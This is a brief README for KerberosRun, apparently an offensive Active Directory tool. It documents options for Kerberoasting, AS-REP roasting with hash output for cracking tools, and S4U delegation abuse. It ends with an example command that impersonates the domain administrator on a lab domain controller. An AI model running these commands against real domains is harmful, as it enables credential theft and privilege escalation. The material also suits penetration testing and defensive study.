# KerberosRun




    Usage: KerberosRun.exe -h

    --Kerberoast    Kerberoasting
        --User      (A valid username)
        --Pass      (A valid password)
        --Domain    (A valid domain name)
        --SPN       (Target SPN for Kerberoasting)
        --Verbose
        
    --Asreproast    ASREPRoasting
        --User      (A valid username that does not require PreAuth)
        --Domain    (A valid domain name)
        --Format    Output Hash format (John/Hashcat, Default: Hashcat)
        --Verbose

    --S4U2Self      Service for User to Self
        --User      (A valid username that has SPN set)
        --Pass      (A valid password)
        --Domain    (A valid domain name)
        --ImperonsateUser  (A user to impersonate)
        --Verbose

    --S4U           S4U2Self and S4U2Proxy
        --User      (A valid username that has SPN set)
        --Pass      (A valid password)
        --Domain    (A valid domain name)
        --ImperonsateUser  (A user to impersonate)
        --SPN       (Target SPN for impersonate user)
        --Verbose

    Example:  .\KerberosRun.exe --s4u --domain corplab.local --user username --pass password --impersonateuser administrator --spn ldap/dc1.corplab.local
